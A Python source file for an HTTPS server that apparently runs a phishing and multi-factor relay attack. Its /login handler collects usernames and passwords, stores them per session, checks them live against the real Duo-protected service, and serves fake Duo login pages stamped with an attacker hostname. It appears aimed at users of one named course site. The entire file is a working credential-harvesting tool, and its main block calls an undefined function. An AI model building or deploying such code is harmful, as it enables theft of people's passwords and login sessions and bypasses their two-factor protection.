from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl
import sys
import os
import threading
import time
from client import duo
import mechanize
import urllib.parse
from http.cookies import SimpleCookie

def make_handler(duo_site, hostname):
	class CustomHandler(SilentHTTPRequestHandler, object):
		def __init__(self, *args, **kwargs):
			self.duo_site = duo_site
			self.hostname = hostname
			super(CustomHandler, self).__init__(*args, **kwargs)
	return CustomHandler

class SilentHTTPRequestHandler(SimpleHTTPRequestHandler):
	def send_head(self):
		"""Common code for GET and HEAD commands.
		This sends the response code and MIME headers.
		Return value is either a file object (which has to be copied
		to the outputfile by the caller unless the command was HEAD,
		and must be closed by the caller under all circumstances), or
		None, in which case the caller has nothing further to do.
		"""
		path = self.translate_path(self.path)
		f = None
		if os.path.isdir(path):
			if not self.path.endswith('/'):
				# redirect browser - doing basically what apache does
				self.send_response(301)
				self.send_header("Location", self.path + "/")
				self.end_headers()
				return None
			for index in "index.html", "index.htm":
				index = os.path.join(path, index)
				if os.path.exists(index):
					path = index
					break
			else:
				return self.list_directory(path)
		ctype = self.guess_type(path)
		try:
			# Always read in binary mode. Opening files in text mode may cause
			# newline translations, making the actual size of the content
			# transmitted *less* than the content-length!
			f = open(path, 'rb')
		except IOError:
			self.send_error(404, "File not found")
			return None
		self.send_response(200)
		self.send_header("Content-type", ctype)
		fs = os.fstat(f.fileno())
		self.send_header("Content-Length", str(fs[6]))
		self.send_header("Last-Modified", self.date_time_string(fs.st_mtime))
		self.send_header("Access-Control-Allow-Origin", "https://6002.catsoop.org")
		self.send_header("Access-Control-Allow-Credentials", "true");
		self.end_headers()
		return f

	def log_message(self, format, *args):
		return

	def do_POST(self):
		time.sleep(5)
		return "HE"

	def do_GET(self):
		print("Socket Server in thread:", self.socket_server)
		self.path = self.path
		params = {}
		if "?" in self.path:
			pstr = self.path.split("?")[1]
			for p in pstr.split('&'): 
				plist = p.split('=')
				params[plist[0]] = urllib.parse.unquote(plist[1])
			self.path = self.path.split("?")[0]
		print(self.path)
		print(params)
		if self.path == "/login":
			SID = str(int(time.time() * 1000.0))
			self.socket_server.add_session(SID, params["j_username"], params["j_password"])

			self.send_response(200)
			self.send_header("Content-type", "text/html")
			cookie = SimpleCookie()

			if not self.duo_site.validateCreds(params["j_username"], params["j_password"]):
				print("invalidc reds")
				cookie['status'] = "invalidCreds"
				self.send_header("Set-Cookie", cookie.output(header='', sep=''))
				self.send_header("Access-Control-Allow-Origin", "https://6002.catsoop.org")
				self.send_header("Access-Control-Allow-Credentials", "true");
				self.send_header("Content-Type", "status=invalidCreds")
				self.end_headers()
			
				#self.send_header("Access-Control-Allow-Methods", "GET, POST");
				p = "mobile-duo.html"	
				if params["mobile"] == "false":
					p = "duo.html"
					
				with open("./idp/Authn/" + p) as page:
					html = page.read()
					html = html.replace("{{ATTACK_DOM}}", self.hostname);
					self.wfile.write(bytes(html, 'utf-8'))
			else:
				cookie['sid'] = SID
				self.send_header("Set-Cookie", cookie.output(header='', sep=''))
				self.send_header("Access-Control-Allow-Origin", "https://6002.catsoop.org")
				self.send_header("Access-Control-Allow-Credentials", "true");
				self.send_header("Content-Type", "sid=" + SID)
				self.end_headers()
	
				if params["mobile"] == "false":
					with open("./idp/Authn/duo-2.html") as page:
						self.wfile.write(bytes(page.read(), 'utf-8'))
				else:
					with open("./idp/Authn/mobile-duo-2.html") as page:
						self.wfile.write(bytes(page.read(), 'utf-8'))

		elif self.path == "/load":
			if "time" in params.keys():
				time.sleep(int(params["time"]))
			else:
				time.sleep(10)
			self.path = "/"
			super().do_GET()
		else:
			super().do_GET()

		

def start_server(host, hostname, socket_server):
	key = os.path.abspath(os.path.dirname(__file__) + '/../ssl/key.pem')
	crt = os.path.abspath(os.path.dirname(__file__) + '/../ssl/cert.pem')
	print("Using key", key)
	print("Using certificate", crt)

	web_dir = os.path.join(os.path.dirname(__file__), 'public')
	os.chdir(web_dir)
			
	print("Trying to host https server on", host + ":443")
	SilentHTTPRequestHandler.socket_server = socket_server
	httpd = HTTPServer((host, 443), make_handler(duo.DuoAuth(mechanize.Browser()), hostname))

	httpd.socket = ssl.wrap_socket (httpd.socket, 
			keyfile=key, 
			certfile=crt, server_side=True)

	print("Socket server before thread:", socket_server)
	httpd.serve_forever()

if __name__ == "__main__":
	startServer(sys.argv[1])
